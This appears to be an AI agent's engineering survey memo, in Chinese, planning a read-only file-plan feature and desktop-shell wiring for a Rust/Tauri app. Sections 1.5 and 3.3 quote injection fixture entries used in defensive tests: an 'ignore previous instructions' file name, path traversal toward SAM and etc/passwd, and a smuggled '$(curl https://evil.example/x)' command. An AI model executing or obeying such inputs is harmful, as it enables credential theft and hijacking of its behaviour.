# SURFACES — WP11（只读文件计划）与「壳接真库」的接口勘探

**模型**：`claude-opus-5-thinking-high-fast`
**分支**：`agent/dev-sota`（工作树，未 commit）
**性质**：接口勘探。本文件不改任何业务代码，所有代码引用均为**现状摘录**，行号对应当前工作树。

一句话：WP11 需要的 HITL 面**已经全部就位且不需要令牌**，真正的两个坑是 (1) `authorized_roots` 全仓没有任何写入者，AC-18 的「授权 A」在真机上无路可走；(2) 「磁盘不变」测试可以照抄 `research_preview.rs`，但那份源码级自查的禁词表**含 `PathBuf` 与 `tempfile`**，文件计划 crate 必然要用 `PathBuf`，照抄会直接红。

---

## 1. WP11 需要的 HITL 面

全部在 `crates/soul-policy/src/hitl.rs`，WP11 只消费、不需要新增。

### 1.1 两个动作已定义

```29:32:crates/soul-policy/src/hitl.rs
    /// Read-only scan of an authorized directory.
    ScanDirectory,
    /// Produce a file-organisation plan. Read-only; v0.1 never executes it.
    PlanFiles,
```

线上名字（`ActionKind::as_str`，`hitl.rs:59-60`）：

| 变体 | 字符串 | 需要令牌？ |
|---|---|---|
| `ActionKind::ScanDirectory` | `"scan.directory"` | 否 |
| `ActionKind::PlanFiles` | `"plan.files"` | 否 |

`needs_capability_token` 只对两个动作返回 `true`：

```73:79:crates/soul-policy/src/hitl.rs
    /// Actions that cannot proceed on the user's standing consent alone.
    pub fn needs_capability_token(self) -> bool {
        matches!(
            self,
            ActionKind::ExecuteForget | ActionKind::GenerateWithUserEndpoint
        )
    }
```

**结论：WP11 不该出现 `TokenIssuer`、不该出现 `CapabilityToken`。** `check_action` 对这两个动作在 `needs_capability_token()` 分支就返回 `ApprovedAction { spent_token: None }`（`hitl.rs:475-481`），压根走不到令牌台账。任何在 WP11 里申请 `CapabilityScope::FileWrite` 的写法都会被两道拒绝：`PolicySession::issue_token`（`crates/soulcore/src/commands/policy.rs:92-97`，返回 `TokenRefused { reason: ReasonCode::WriteNotImplemented }`）和 `TokenIssuer::consume`（`hitl.rs:308-310`，即便令牌完美也先 `WriteNotImplemented`）。

**红线**：`ActionKind::ALL.len() == 8` 被测试钉死，WP11 不得增删动作。

```76:80:crates/soul-policy/tests/hitl.rs
    assert_eq!(
        ActionKind::ALL.len(),
        8,
        "adding an action is a scope decision, not a refactor",
    );
```

### 1.2 `check_action` 的签名与检查顺序

```452:456:crates/soul-policy/src/hitl.rs
pub fn check_action(
    issuer: &mut TokenIssuer,
    request: &ActionRequest,
    now_ms: u64,
) -> Result<ApprovedAction, HitlDenial> {
```

顺序（`hitl.rs:457-497`）：动作名解析 → `RequestOrigin` → plan hash 比对 → 令牌。对 WP11 有意义的是前三步：

1. **未知动作**：`ActionKind::parse` 返回 `None` → `HitlDenial::UnknownAction`。这是 `"file.write"` 这类名字被挡住的地方（`tests/hitl.rs:53-67` 已经把 `"file.write"` 列进穷举）。
2. **来源**：`RequestOrigin::ExternalContent` → `HitlDenial::ExternalContentNotAuthority`。**WP11 必须用这一条**：如果扫描/计划请求是从文件名内容里推导出来的（注入语料就是干这个的），来源必须标 `ExternalContent`，然后被拒。
3. **plan hash**：`request.approved_plan_hash` 与 `request.plan_hash()` 不等 → `HitlDenial::PlanHashMismatch { approved, current }`。注意 `approved_plan_hash` 是 `Option`：不设就不比对。WP11 的「用户批准了预览之后计划被改」这条要显式 `.approved_as(hash)`。

`ActionRequest` 的建造者（`hitl.rs:381-410`）：

```rust
ActionRequest::new(ActionKind::PlanFiles.as_str(), RequestOrigin::User)
    .with_plan(plan_json)          // serde_json::Value
    .approved_as(PlanHash::of(&plan_json))
    // .with_token(..) — WP11 不用
```

### 1.3 plan hash

```126:133:crates/soul-policy/src/hitl.rs
impl PlanHash {
    /// Hash the canonical JSON encoding of a plan.
    pub fn of(plan: &serde_json::Value) -> PlanHash {
        // `serde_json::Value`'s map is a BTreeMap here, so the encoding is
        // key-sorted and the digest is stable across processes.
        let canonical = serde_json::to_vec(plan).unwrap_or_default();
        PlanHash(hex::encode(Sha256::digest(canonical)))
    }
```

另有 `PlanHash::from_hex(impl Into<String>)`、`as_str() -> &str`。

**「计划」应该是什么形状**：照 WP08 的先例 `soulcore::commands::policy::e1_plan`（`crates/soulcore/src/commands/policy.rs:175-183`）——**计数与类别，不是正文**。它是一个 `serde_json::json!({...})`，字段全是 `model` / `third_party_turns` / `placeheld_turns` / `carries_exempted_original` 这种。WP11 的 file plan 同理：根目录标识、条目数、拟议动作类别与计数，**不要把文件名原文塞进被 hash 的计划**（文件名是 `UntrustedText`，进了计划就进了审计侧的 `plan_hash` 语义，而且会让 hash 随一次 rename 无意义地翻动）。

### 1.4 审计侧：动作码已冻结，reason code **缺一个**

- `AuditAction::FilePlan`（`crates/soul-schema/src/audit.rs:34-35`，`serde` 名 `"file.plan"`）**已在冻结 schema 的 enum 里**（`docs/schemas/audit.schema.json:24-`），WP11 不需要动 schema，不需要 `schema-freeze --write`。`crates/soul-policy/tests/audit_chain.rs:94` 已经在链里放了一条 `AuditAction::FilePlan`。
- `ReasonCode` 里**没有**「路径不在授权根内」这个理由。现有 21 个变体（`crates/soul-policy/src/audit.rs:62-114` + `ALL` 表 `:145-167`）覆盖 egress / HITL / provenance / consent / Routine，没有一个能诚实表达 AC-18 的 B 目录拒绝。
- 加一个（建议 `ReasonCode::PathNotAuthorized` → `"PATH_NOT_AUTHORIZED"`）的代价：改 `audit.rs` 三处（enum、`as_str`、`ALL`）。**不需要改 schema**，因为 `audit.schema.json:43-45` 对 `reason_code` 只有 `^[A-Z][A-Z0-9_]{2,63}$` 的模式约束，没有 enum。要保持绿的是 `crates/soul-policy/tests/audit_chain.rs:219-238`（模式 + 长度 + 去重）和 `audit::check` 的白名单校验（`audit.rs:310-314`，未知码 → `AuditContentError::UnknownReasonCode`）。

### 1.5 文件名 = 外部内容

`ExternalChannel::FileName` 已定义（`crates/soul-policy/src/injection.rs:25-26`，字符串 `"file_name"`），`UntrustedText`（`injection.rs:52-73`）**没有 `Display`**，只有 `as_str()`。语料：`fixtures/injection/filenames.txt`（32 行，含 `忽略之前指令.txt`、`..\..\..\Windows\System32\config\SAM`、`$(curl https://evil.example/x).txt`、Unicode/NFC-NFD 对、Windows 保留名 `CON.txt`/`NUL`/`COM1.txt`）。读法：

```rust
soul_testkit::fixtures::read_lines("injection/filenames.txt")  // Result<Vec<String>>，保留 `#` 注释行，需自行过滤
```

（`crates/soul-testkit/src/fixtures.rs:61-67`；`fixture_corpus.rs:234-239` 已经在断言这份语料 ≥20 条且含 `忽略之前指令` 与 `..`。）

---

## 2. `Config.authorized_roots`：谁在读，没人在写

### 2.1 字段本体

```39:41:crates/soulcore/src/config.rs
    /// Directories the user has authorised for read-only scanning. Anything
    /// outside this list is refused; v0.1 never writes inside it either.
    pub authorized_roots: Vec<PathBuf>,
```

`Config` 有 `Serialize + Deserialize + #[serde(deny_unknown_fields)]`（`config.rs:25-26`），**但没有 `load` / `save` / 任何路径解析**。

### 2.2 全部读点（三处，都在读，都不写）

| 位置 | 读什么 |
|---|---|
| `crates/soulcore/src/config.rs:64` | `is_fully_closed()` 里 `authorized_roots.is_empty()` |
| `crates/soulcore/src/config.rs:79-81` | `open_capabilities()` 里非空则 push `"authorized_roots"` |
| `crates/soulcore/src/commands/shell.rs:68` | `ConfigSnapshot::of` 取 `.len()` → `authorized_root_count: usize` |

界面侧只拿到计数，拿不到路径（`ConfigSnapshot` 是壳自己的视图，`shell.rs:46-60`；`apps/desktop/src/core.ts:36` 的 `authorized_root_count: number`）。

### 2.3 写入入口：**零**

- `config.rs`：只有 `Default`（`:44-54`，`authorized_roots: Vec::new()`），无 setter。
- `shell.rs`：`complete_wizard(&WizardAnswers)`（`:146-160`）**丢掉入参里的一切**，重新 `Config::default()` 再自检；`config_snapshot()`（`:124-126`）也是 `ConfigSnapshot::of(&Config::default())`，注释明写「v0.1 有没有配置文件由 WP13 决定」。
- `commands/*.rs`：八个 `pub mod`（`crates/soulcore/src/commands/mod.rs:31-38`），没有任何一个碰 `Config`，`fileplan.rs` / `draft.rs` 只存在于同文件的头注释里（`mod.rs:16-17`）。
- `apps/desktop/src-tauri/src/commands.rs:17-18`：`pub struct SessionConfig(pub Config)` + `#[derive(Default)]`，`lib.rs:32` 只 `manage(commands::SessionConfig::default())`。

**后果（Round 1 记为 D3）**：`authorized_roots` 恒为空 → `ConfigSnapshot.authorized_root_count` 恒为 0 → AC-18 的「授权 A」在真机上不可达。WP11 的 CI 测试可以自己构造 `Config { authorized_roots: vec![a], ..Default::default() }` 绕过，但那只关掉 CI 门禁，产品上仍然没有授权入口。**这条必须在 WP11 的工作单里写清楚是「已知缺口，归属另一单」，否则 WP11 会顺手去改 `shell.rs`，和壳接线/WP13 撞车。**

---

## 3. 「磁盘不变」怎么写：`crates/soul-store/tests/research_preview.rs` 的手法

WP11 要照抄的是两条测试 + 一个 helper。

### 3.1 运行期：名字 + 字节长度快照，跑三遍

```228:251:crates/soul-store/tests/research_preview.rs
#[test]
fn a_preview_leaves_no_new_file_behind() {
    let dir = tempfile::tempdir().expect("temp dir");
    let mut store = SqlCipherStore::open(
        dir.path().join("research.db"),
        &TestKeyProvider::from_seed(SEED),
    )
    .expect("open");
    seed(&mut store);
    store.flush().expect("settle the database files first");

    let before = entries(dir.path());
    for _ in 0..3 {
        store
            .research_preview(&ResearchPreviewRequest::default())
            .expect("preview");
    }
    let after = entries(dir.path());

    assert_eq!(
        before, after,
        "a research preview must not create, or grow into, any file",
    );
}
```

helper：

```287:299:crates/soul-store/tests/research_preview.rs
/// Name, size and modification-agnostic snapshot: names plus byte lengths.
fn entries(dir: &std::path::Path) -> Vec<(String, u64)> {
    let mut out: Vec<(String, u64)> = std::fs::read_dir(dir)
        .expect("read the store directory")
        .map(|entry| {
            let entry = entry.expect("directory entry");
            let length = entry.metadata().expect("metadata").len();
            (entry.file_name().to_string_lossy().into_owned(), length)
        })
        .collect();
    out.sort();
    out
}
```

四个设计点，WP11 应逐条照搬：

1. **只比名字 + 字节数**，不比 mtime（注释里就叫 `modification-agnostic`）。理由：mtime 会因为无关的 atime/目录刷新抖动，把测试变成 flaky；字节数变化才是「写过」的证据。
2. **先 `flush()` 再取 `before`**。这里是把 WAL 落盘让数据库文件安静下来；WP11 扫的是普通目录，没有 WAL，但**同样要在取 `before` 之前把所有 setup 写完**，否则测的是 setup 的尾巴。（`flush` 来自 `SoulStore` trait，`crates/soul-store/src/lib.rs:70-72`，用它要 `use soul_store_api::SoulStore;`。）
3. **跑三遍**。一次调用可能恰好没触发惰性写；重复是廉价的。
4. **`tempfile::tempdir()`**，每个测试各自一个目录。

**WP11 需要加强的地方**（研究预览没这个问题，文件计划有）：`entries()` 只看 `read_dir` 的**一层**。文件计划的对象是**树**，所以 WP11 的快照必须递归，且要覆盖三样研究预览不必管的东西：

- 子目录里的文件（递归，路径用相对 root 的形式排序）；
- **条目集合本身**（新建/删除的文件会改集合，改名会同时改两个条目）；
- **root 之外**：授权根 A 之外还要对未授权目录 B 取一次快照，证明「被拒绝」不等于「拒绝前偷看/偷写了」。

### 3.2 源码级：读回自己的源码，断言没有写 API

```256:285:crates/soul-store/tests/research_preview.rs
#[test]
fn the_research_module_cannot_reach_the_filesystem() {
    const SOURCE: &str = include_str!("../src/research_preview.rs");

    let forbidden = [
        "fs::write",
        "fs::create_dir",
        "create_dir_all",
        "File::create",
        "OpenOptions",
        "fs::copy",
        "fs::rename",
        "BufWriter",
        "std::io::Write",
        "tempfile",
        "PathBuf",
    ];
    for needle in forbidden {
        assert!(
            !SOURCE.contains(needle),
            "research_preview.rs mentions `{needle}`; v0.1 research must not write anything",
        );
    }

    // Guard against the assertion above passing because the file moved.
    assert!(
        SOURCE.contains("fn research_preview"),
        "the source being scanned should be the research preview module",
    );
}
```

两个手法值得学：`include_str!` 把源码当数据读回来；末尾一条**锚点断言**（`SOURCE.contains("fn research_preview")`），防止文件被挪走之后禁词表在空字符串上假绿。

**⚠️ 照抄的第一个坑**：这份禁词表里有 `"PathBuf"` 和 `"tempfile"`。研究预览确实一个路径类型都不需要，文件计划**必然**要 `PathBuf` / `Path` / `read_dir`。WP11 的表必须重写为「写 API」而不是「一切文件系统符号」：

建议保留：`fs::write`、`fs::create_dir`、`create_dir_all`、`File::create`、`OpenOptions`、`fs::copy`、`fs::rename`、`fs::remove_file`、`fs::remove_dir`、`fs::set_permissions`、`fs::hard_link`、`std::os::unix::fs::symlink`、`BufWriter`、`std::io::Write`、`write!`、`writeln!`、`File::options`、`.truncate(`、`.append(`、`.create_new(`。
必须去掉：`PathBuf`、`tempfile`（后者若要保留，只能扫 `src/`，不扫 `tests/`——本来 `include_str!` 就只指向 `src/`，但 crate 的 dev-dependency 里会有 `tempfile`，别把断言写到 `Cargo.toml` 上）。

**⚠️ 第二个坑**：`include_str!` 只覆盖**被点名的那一个文件**。`soul-fileplan` 会有多个模块，禁令是「crate 无写 API」（`docs/GOAL1_PLAN.md:82`），所以要么把扫描做成遍历 `src/` 下所有 `.rs`（用 `env!("CARGO_MANIFEST_DIR")` + `read_dir` 递归，测试里读文件系统是允许的），要么在 crate 根加 `#![forbid(...)]` 级别的结构约束并对每个模块各写一条 `include_str!`。**推荐前者，并保留锚点断言**（断言扫到的文件数 ≥ 实际模块数，且至少含 `fn plan` 之类）。

### 3.3 「拒绝是 100% 的」怎么表达

`research_preview.rs` 里的对应手法是 `report.third_party_rows_excluded > 0` + `candidate_rows_total == excluded + rows.len()`（`:145-154`）——**排除数必须非零，且守恒**。WP11 的 B 目录版本应当是同一个结构：

- 对 B 的每一次请求都返回 `Err`，且 `Err` 的 reason code 是那一个（不是 `Routine`）；
- 请求条目数 = 拒绝数（守恒），没有「部分成功」；
- B 的目录快照前后一致（连读都不该留痕，至少不该写）；
- 用 `fixtures/injection/filenames.txt` 的路径穿越条目（`..\..\..\Windows\System32\config\SAM`、`....//....//etc/passwd`、`\\?\C:\Windows\System32\cmd.exe`）构造「看起来在 A 里、规范化后在 A 外」的输入，逐条拒绝。**规范化必须在授权判定之前**，否则 `A/../B` 会通过前缀检查。

---

## 4. 桌面壳：接真库要碰的面

### 4.1 现状

```30:38:apps/desktop/src-tauri/src/lib.rs
pub fn configure<R: tauri::Runtime>(builder: tauri::Builder<R>) -> tauri::Builder<R> {
    builder
        .manage(commands::SessionConfig::default())
        .invoke_handler(tauri::generate_handler![
            commands::config_snapshot,
            commands::complete_wizard,
            commands::cloud_toggle
        ])
}
```

`run()`（`lib.rs:40-60`）在 `.setup(...)` 里只 `manage(tray::install_or_report(app.handle()))`。**没有任何 store。**

```17:18:apps/desktop/src-tauri/src/commands.rs
#[derive(Debug, Default)]
pub struct SessionConfig(pub Config);
```

三条命令（`commands.rs:20-33`）各自一行 body，`COMMAND_NAMES`（`:40`）= `["config_snapshot", "complete_wizard", "cloud_toggle"]`。

### 4.2 单句柄纪律与 `share`

```29:32:crates/soulcore/src/commands/collect.rs
/// The store, ready to be shared with a collector thread.
pub fn share(store: SqlCipherStore) -> Arc<Mutex<SqlCipherStore>> {
    Arc::new(Mutex::new(store))
}
```

采集线程按 `Arc<Mutex<SqlCipherStore>>` 拿库（`collect::start` 的第二参，`collect.rs:47-57`）。STATUS「WP07 遗留 8」与 Round 1 都要求：**整个进程只能有一个 store 句柄，在 `lib.rs` 的 `setup` 里开一次并 `manage`**，不要在每个命令里开——两个连接会各写各的 WAL。

所以壳侧的 managed state 应该是 `Arc<Mutex<SqlCipherStore>>`（或包着它的 newtype），不是 `SqlCipherStore`。

### 4.3 开库入口

```22:44:crates/soulcore/src/commands/store.rs
pub const DATABASE_FILE_NAME: &str = "soul.db";

pub fn database_path(directory: impl AsRef<Path>) -> PathBuf { ... }

/// Open the store under a caller-supplied key provider.
pub fn open_store(
    directory: impl AsRef<Path>,
    keys: &dyn KeyProvider,
) -> StoreResult<SqlCipherStore> {
    SqlCipherStore::open(database_path(directory), keys)
}

/// Open the store with test key material.
pub fn open_test_store(directory: impl AsRef<Path>, seed: &str) -> StoreResult<SqlCipherStore> {
    let keys = TestKeyProvider::from_seed(seed);
    open_store(directory, &keys)
}
```

注释明写「`%LOCALAPPDATA%\Soul` 的解析是 WP09 的活，这个 crate 要能在 Linux CI 上 headless 跑」。

底层：`SqlCipherStore::open(path, &dyn KeyProvider) -> StoreResult<Self>`（`crates/soul-store/src/store.rs:100`），会 `create_dir_all(parent)`；另有 `path() -> &Path`（`:163`）、`key_provider_label() -> &str`（`:168`，「哪个 provider 供的密钥，绝不是密钥材料」）、`close(self) -> StoreResult<()>`（`:174`）。

### 4.4 KeyProvider 三件套

```102:111:crates/soul-store/src/keys.rs
pub trait KeyProvider: fmt::Debug + Send + Sync {
    /// Whole-file key handed to SQLCipher. Protects every page of `soul.db`.
    fn database_key(&self) -> KeyResult<SecretKey>;

    /// Wraps every per-forget-unit content key in the `content_keys` table.
    fn key_encryption_key(&self) -> KeyResult<SecretKey>;

    /// Short label for logs and for the audit trail. Never key material.
    fn describe(&self) -> String;
}
```

| 实现 | 构造 | 行为 | `describe()` |
|---|---|---|---|
| `TestKeyProvider::from_seed(impl Into<String>)`（`keys.rs:139`） | 固定串按域分离派生 DEK/KEK | 跨进程可重现 | `"test-key-provider(seed)"` |
| `TestKeyProvider::in_dir(impl AsRef<Path>)`（`keys.rs:146`） | `dir/soul-test-keys.bin`，首用时生成 64 字节 | 明文种子落盘 | `"test-key-provider(file)"` |
| `DpapiKeyProvider::new(impl Into<PathBuf>)`（`keys.rs:220`） | 记住 blob 路径 | **两个取密钥入口都 `Err(KeyError::Unsupported)`**（`:230-247`），Windows 与非 Windows 各一条分支 | `"dpapi-key-provider"` |

`DpapiKeyProvider` 的拒绝行为被单测钉住（`keys.rs:304-316`）。`docs/SECURITY.md` 明写：**「补齐 DPAPI 前不得声称 Windows 上 KEK 已受保护」**。壳如果用 `TestKeyProvider` 落地，UI 与 SECURITY 必须如实写（这也是 `agent/dev-sota` PROGRESS 第 23 行的约束）。`key_provider_label()` 正好是给 UI 显示「当前密钥来源」的那个不泄密字符串。

### 4.5 壳侧四道结构锁（新增命令必须同时满足）

1. **命令体最多一条语句**——`apps/desktop/src-tauri/tests/command_surface.rs:93-113` 的 `the_command_layer_stays_thin` 逐个数 body 里的非空非注释行。所以「开库 + 查询 + 组装」不能写在 `commands.rs`，必须在 `soulcore` 里做成一个函数。
2. **两侧命令名一致**——`COMMAND_NAMES`（Rust）↔ `apps/desktop/src/core.ts` 的 `COMMANDS` 对象。Rust 侧 `command_surface.rs:31-88` 三条测试（名字一致、每个名字确有 `#[tauri::command]` 且在 `lib.rs` 注册、没有列表外的命令）；TS 侧 `apps/desktop/src/contract.test.ts:57-63` 再比一次。
3. **只有 `core.ts` 能 import `@tauri-apps/api`**——`contract.test.ts:48-55` + `eslint.config.js`。
4. **UI 树不得出现诊断词/量表词**——`contract.test.ts:84-107` 用 `fixtures/denylist/diagnostic_terms.txt` 扫 `src/**/*.{ts,tsx,css}`。

另有一条对 WP11 直接相关的负面锁：

```135:138:apps/desktop/src-tauri/tests/ipc_roundtrip.rs
/// A command the shell does not have must not resolve to something.
#[test]
fn an_unknown_command_is_refused() {
    assert!(invoke("execute_file_plan", json!({})).is_err());
}
```

以及前端 `apps/desktop/src/App.test.tsx:55-62`：`/files` 路由上任何 button 的文案不得匹配 `/执行|应用|移动|重命名|删除/`，且 `pending-owner` 必须仍是「WP11 未落地」。**只要 `router.tsx` 里 `files` 的 `ownedBy` 还是 `"WP11"`，`App.tsx:86-88` 就会渲染 `Pending`；WP11 若要上真视图，必须同时改 `router.tsx`、`App.tsx` 的路由分支和这条测试——这是 UI 面，不是 WP11 权限面的活。**

---

## 5. 独立 desktop workspace 怎么依赖 soulcore

`apps/desktop/src-tauri/Cargo.toml` 是**自己的 workspace**：

```10:16:apps/desktop/src-tauri/Cargo.toml
# Its own workspace on purpose. `cargo test --workspace` at the repository root
# runs on a Linux CI host that has no WebKitGTK, and a member here would make
# every Rust check in the repository depend on the GUI stack of a platform this
# product does not target. `just desktop-check` builds it, and the Windows CI
# job — the platform v0.1 actually ships on — builds it on every push.
[workspace]
```

依赖只有一条相对路径，**不走 `workspace = true`**（那是根 workspace 的机制，这里够不到）：

```34:38:apps/desktop/src-tauri/Cargo.toml
[dependencies]
tauri = { version = "2", features = ["tray-icon", "image-png"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
soulcore = { path = "../../../crates/soulcore" }
```

推论，对「壳接库」实现者：

- 壳**只**依赖 `soulcore`。要用 `SqlCipherStore` / `KeyProvider` / `Arc<Mutex<..>>`，正确做法是**在 `soulcore` 里 re-export 或包一层**（`commands/store.rs` 与 `commands/collect.rs` 已经在这么做：`collect.rs:23-27` 把 `soul_collect::*` re-export 出来），**不要**在 desktop 的 `Cargo.toml` 里加 `soul-store = { path = "../../../crates/soul-store" }`。多一条 path 依赖就多一棵在根 `deny.toml` / `xtask e0-audit` 视野之外的树。
- 版本号在这边是裸字符串（`"2"`、`"1"`），不是根 `[workspace.dependencies]` 的钉法。加依赖前先想清楚 Rust 1.83 的 MSRV（`rust-version = "1.83"`，`Cargo.toml:5`）。
- 加任何依赖都要过 `apps/desktop/src-tauri/tests/no_egress_path.rs`：它对 `x86_64-pc-windows-msvc` 与 `x86_64-unknown-linux-gnu` 两个平台跑 `cargo metadata --filter-platform`，BFS 整棵 normal+build 图，命中 `reqwest/hyper/ureq/curl/isahc/attohttpc/surf` 且路径不经过 `soul-egress` 就红；`tauri-plugin-updater` / `tauri-plugin-http` 无条件红（`:21-31`、`:141-152`、`:185-195`）。
- 新建的 `soul-fileplan` 若要给壳用，得先进根 `Cargo.toml` 的 `members` 与 `[workspace.dependencies]`（`Cargo.toml:3-17`、`:61-71`），再由 `soulcore` 依赖它，壳通过 `soulcore` 够到。
- CI 现状：`just ci`（`justfile:78`）**不含** desktop；`desktop-check` / `desktop-test`（`justfile:118-123`）另跑，Windows job 调的是 `desktop-test`。所以壳侧改动在 Linux 上不会被 `just ci` 抓到，本地要手动跑 `just desktop-test`（需要 WebKitGTK 等 GUI 栈，见 `justfile:110-112` 的 apt 清单）。

---

## 6. 配置持久化的最小切口（**只给建议，本轮不实现**）

### 6.1 现状边界

- `Config` 已经有 `Serialize + Deserialize + deny_unknown_fields`，序列化形状被两条测试钉住（`crates/soulcore/tests/config_defaults.rs:36-42` 的字段值，`:44-55` 的未知字段拒绝；`crates/soulcore/tests/shell_commands.rs:108-116` 的 `cloud_state: "enabled"` 必须反序列化失败）。**JSON 形状已经是稳定契约，加 load/save 不需要改形状。**
- 目录解析目前无人做。`commands/store.rs:19-22` 把「解析 `%LOCALAPPDATA%\Soul`」明确指给 WP09，`DATABASE_FILE_NAME = "soul.db"` 已在那里；配置文件应与 `soul.db` 同目录（Round 1 `r1-opus-gap-debt.md` WP13 一节的原话）。
- 「向导是否完成」目前只是 React state（`apps/desktop/src/App.tsx:32`），`AppProps.wizardDone` 的注释把这个问题指名给 WP13（`App.tsx:21-26`）。

### 6.2 建议的切口：`crates/soulcore/src/config.rs`，只加两个函数

```rust
// 仅为形状建议，本轮不写
impl Config {
    pub fn load(path: &Path) -> Result<Config, ConfigError>;   // NotFound → Ok(Config::default())
    pub fn save(&self, path: &Path) -> Result<(), ConfigError>;
}
```

理由：

1. **不新建文件、不新建 crate**。`config.rs` 现在 85 行，只有 `Config` 与 `CloudState`，是这个语义唯一的家；`commands/shell.rs` 是「壳能看见什么」的视图层（它连端点字符串都刻意不给 UI，`shell.rs:40-53`），把持久化塞进去会让那层同时管视图和 IO。
2. **路径由调用方传入，`soulcore` 不解析平台目录**。这一条是保住「`soulcore` 能在 Linux CI 上 headless 跑」的关键，也是 `store.rs` 已经采用的模式（`open_store(directory, keys)`）。`%LOCALAPPDATA%\Soul` 的解析留在壳 / WP13。
3. **`NotFound` 返回默认值而不是错误**。首次启动没有文件是正常状态，不是故障；这样 `load` 的语义和 `Config::default()` 的「一切关闭」承诺自然对齐，AC-02 不会因为多了一个文件而多一条绕过路径。
4. **不在这一步加任何 setter**。`authorized_roots` / `llm_endpoint` / `collect_enabled` 的写入控件归属未定（Round 1 明确说 WP09 功能视图与 WP13 都能争，需要父代理指派）。只加 load/save 不加 setter，等于把「持久化机制」和「谁能改配置」两个决定解耦，任何一方后来接手都不用重做这一层。

### 6.3 与 WP13 的分界（避免抢范围）

| 属于这个小切口 | 属于 WP13 |
|---|---|
| `Config::load` / `Config::save` 的实现与往返测试 | 配置文件**放在哪**（`%LOCALAPPDATA%\Soul\config.json` 的解析与创建） |
| 文件不存在 → 默认值 | 「向导是否完成」这一位存在哪里、叫什么 |
| 未知字段/损坏文件的拒绝行为 | 迁移器（`meta.schema_version = 1` 至今无迁移器） |
| — | 安装 smoke、SBOM、NSIS、CI 缺口 |

**明确不要做**：不要在这一步给 `complete_wizard` 加「写盘」副作用。它现在是纯函数（`shell.rs:146-160`），`crates/soulcore/tests/shell_commands.rs` 与 `apps/desktop/src-tauri/tests/ipc_roundtrip.rs:82-105` 都按纯函数测。改它的签名会同时动三个测试文件和 `core.ts`，属于壳接线/WP13 的范围。

---

## 7. 文件所有权建议

两个实现者：**A = WP11（权限/文件计划面）**，**B = 壳接真库（集成面）**。目标是两人的 diff 不相交。

### 7.1 A 独占（WP11）

| 文件 | 动作 |
|---|---|
| `crates/soul-fileplan/**`（新建） | 新 crate，**无写 API**，含源码级自查测试 |
| `crates/soulcore/src/commands/fileplan.rs`（新建） | 薄封装，照 `store.rs` / `collect.rs` 的 pass-through 风格 |
| `crates/soul-policy/src/audit.rs` | **只加** `ReasonCode::PathNotAuthorized`（enum + `as_str` + `ALL` 三处） |
| `crates/soul-policy/tests/hitl.rs` | 若要补 `ScanDirectory` / `PlanFiles` 的 HITL 用例，加在这里 |

### 7.2 B 独占（壳接库）

| 文件 | 动作 |
|---|---|
| `apps/desktop/src-tauri/src/lib.rs` | `setup` 里开一次库、`manage(Arc<Mutex<SqlCipherStore>>)` |
| `apps/desktop/src-tauri/src/commands.rs` | `SessionConfig` 改造；新命令仍须**一行 body** |
| `apps/desktop/src-tauri/Cargo.toml` | 仅在必要时；**不得**新增 `soul-*` path 依赖（走 `soulcore`） |
| `apps/desktop/src/core.ts` | 新命令名与类型 |
| `crates/soulcore/src/commands/shell.rs` | `ConfigSnapshot` 若要带「密钥来源」等新字段 |
| `crates/soulcore/src/config.rs` | `load` / `save`（§6，如果本轮授权做） |

### 7.3 共有文件——必须指定单一所有者

| 文件 | 为什么会撞 | 建议 |
|---|---|---|
| **`Cargo.toml`（根）** | A 要加 `crates/soul-fileplan` 进 `members` + `[workspace.dependencies]`；B 一般不动 | **A 所有**。B 若需要加依赖，走 A 的 PR 或在 A 落地后 rebase |
| **`crates/soulcore/src/commands/mod.rs`** | A 加 `pub mod fileplan;`（第 31-38 行那一列）；WP10 会加 `pub mod draft;` | **A 加自己那一行**，WP10 加自己那一行。两行不相邻则无冲突；建议 A 先落地 |
| **`crates/soulcore/Cargo.toml`** | A 加 `soul-fileplan` 依赖 | **A 所有** |
| **`crates/soul-policy/src/audit.rs`** | A 要加 reason code；WP10 不需要新 code（复用 `ThirdPartyBody*`） | **A 所有**。若 WP10 也要加，先在 PROGRESS 里登记 |
| **`apps/desktop/src/router.tsx` / `App.tsx` / `App.test.tsx`** | `/files` 路由的 `ownedBy` 与 `Pending` | **谁都不动**。WP11 本轮不接 UI；`ownedBy: "WP11"` 与那条「没有执行按钮」的断言原样保留。要接视图是 WP09 功能视图的单 |
| **`apps/desktop/src-tauri/src/commands.rs` + `src/core.ts`** | 两处命令名必须同步改，且被四条契约测试交叉锁死 | **B 所有**。A 不加任何 Tauri 命令 |
| **`docs/STATUS.md`** | 双方都会写完成情况 | 各写各的小节，最后由父代理合并；或约定 A 先写 |
| **`docs/schemas/*` + `schemas.lock.json`** | 谁都别动 | **冻结**。WP11 用的 `file.plan` 已在 enum 里，reason code 只有模式约束，两边都不需要 `schema-freeze --write` |

### 7.4 一条硬边界

**A 不写任何 Tauri 命令，B 不写任何文件计划逻辑。**
A 的产出止步于 `soulcore::commands::fileplan` 的公开函数；B 的产出止步于把 store 句柄 `manage` 起来并让现有三条命令读真配置。二者在 `soulcore` 的 `commands/` 目录里通过**不同文件**相接，任何一方想跨过去，都会立刻在 `command_surface.rs::the_command_layer_stays_thin`（一行 body）或 `contract.test.ts`（两侧命令名）上撞墙——这两条测试本身就是所有权边界的执行者。

---

## 8. 陷阱速查

1. `research_preview.rs` 的禁词表含 `PathBuf` / `tempfile`，**不能整表照抄到文件计划**（§3.2）。
2. `include_str!` 只覆盖一个文件；「crate 无写 API」需要遍历 `src/`（§3.2）。
3. WP11 **不需要**令牌。碰 `TokenIssuer` 就是走错路（§1.1）。
4. `ActionKind::ALL.len() == 8` 被测试钉死，不得增删动作（§1.1）。
5. `ReasonCode` 缺「路径未授权」，要加；`AuditAction::FilePlan` 已有，不要重复造（§1.4）。
6. `authorized_roots` 全仓无写入者，CI 可自造 `Config`，但真机缺口要在文档里如实记（§2.3）。
7. 路径规范化必须在授权判定**之前**，否则 `A/../B` 通过前缀检查（§3.3）。
8. 壳的命令 body 最多一条语句；命令名两侧四道锁（§4.5）。
9. desktop 是独立 workspace，只依赖 `soulcore`；加依赖前想好 `no_egress_path.rs` 与 MSRV 1.83（§5）。
10. 别给 `complete_wizard` 加写盘副作用（§6.3）。
